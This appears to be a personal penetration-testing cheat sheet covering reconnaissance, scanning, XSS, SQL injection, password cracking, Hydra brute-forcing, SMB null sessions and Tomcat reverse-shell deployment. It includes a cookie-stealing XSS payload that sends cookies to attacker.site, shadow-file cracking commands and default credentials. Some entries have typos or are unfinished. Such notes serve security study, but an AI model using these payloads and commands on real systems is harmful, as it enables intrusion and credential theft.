# Penetration Testing Process

## Information Gathering
- ### OSINT
  - Social Networks
  - Public Sites
- ### Subdomain Enumeration
  - search query: 'site: company.com'
  - dnsdumpster.com
  - sublist3r

## Footprinting & Scanning
- ### Network Mapping
  - Ping Sweeping: akd Host Discover
    - `fping -a -g <IPRANGE>` 
    - `nmap -sn <IPRANGE>`
  - OS Fingerprinting
    - `nmap -Pn -O <IPRANGE>`
- ### Port Scanning
  - `nmap -sS -sV <IPRANGE>`
  - `nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open`

## Vulnerability Assessment
- ### Nessus
- ### Manually
  - learn & understand features of application
  - how does it application exchange data over the internet?
  - how does it access resources (ie. databases, servers, local/remote files, etc.)?
  - attempt to reverse engineer its logic 

## Web Attacks
- ### Exploiting Misconfigured HTTP Verbs
  - TODO
- ### Directory & File Enumeration
  - `gobuster dir -u <url> -w [dictionary wordlist to use] -x [extensions to look for]`
    - typical wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    - extensions I usually look for: .php,.txt,.bak,.old,.css,.js,.html,.htm
- ### XSS
  - test every user input: forms, search bars, GET/POST parameters, url query parameters, cookies
  - types:
    - reflected
      - users trigger payload when visiting a link
    - persistent
      - payload stored on server & triggers everytime injected web page is hit
      - common attack vectors:
        - injecting HTML, JS, PHP into comments, user profile information, forums
  - Payload to steal cookies and send to attacker controlled site:
    - `<script>var i = new Image(); i.src="http://attacker.site/log.php?q="+document.cookie;<script>`
  - Mostly use to upload reverse shell code to gain access to servers
- ### SQL Injection
  - exploit dynamic queries (queries reliant on user input)
  - test user inputs for injection points
  - SQLMap: used to exploit injection points
    - `sqlmap -u <url> -p <injection point parameter> [options]`
   
## System Attacks
- ### Password Cracking
  - John The Ripper
    - if you are able to acquire passwd and shadow file from linux system: 
      - `unshadow /etc/passwd /etc/shadow > crackme`
      - `john crackme`
    - basic dictionary attack:
      - `john --format=[hash-format] --wordlist=[password-list] [password-hash-list]`
        - wordlist i mostly use: /usr/share/wordlists/rockyou.txt
        - can use hash-identifier to identify hash format

## Network Attacks
- ### Authentication Cracking
  - Used for SSH, RDP, etc.
  - Hydra:
    - `hydra -L [users-list] -P [password-list] [service://server] [options]`
      - ex to crack ssh: `hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.100.10`
- ### Windows Share Attacks
  - Windows:
    - `nbtstat -A [target IP]` : shows us what file sharing services are up and running
      - look for record type <20> 
    - if <20> record type:
      - `NET VIEW [target IP]` : enumerates shares
  - Linux:
    - `nbmlookup -A [target IP] : enumerate shares
    - `smbclient -L //IPADDRESS -N` : client to access Windows shares
      - -L look at services available on target
      - -N forces tool to not ask for password
  - Identify Null Sessions
    - try to connect to IPC$ share without valid credentials
      - Windows: `NET USE \\TARGETIPADDRESS\IPC$ '' /u:''`
      - Linux: `smbclient //TARGETIPADDRESS/IPC$ -N`
  - Exploiting Null Sessions
    - Enum4Linux
- ### ARP Poisoning
  - TODO

## Exploiting Common Services
- ### Apache Tomcat
  - Default Directory: /manager/html
  - Most Common Default Credentials: tomcat:s3cret
  - Upload and deploy reverse shell .war file 
- ### MS SQL Server
  - 
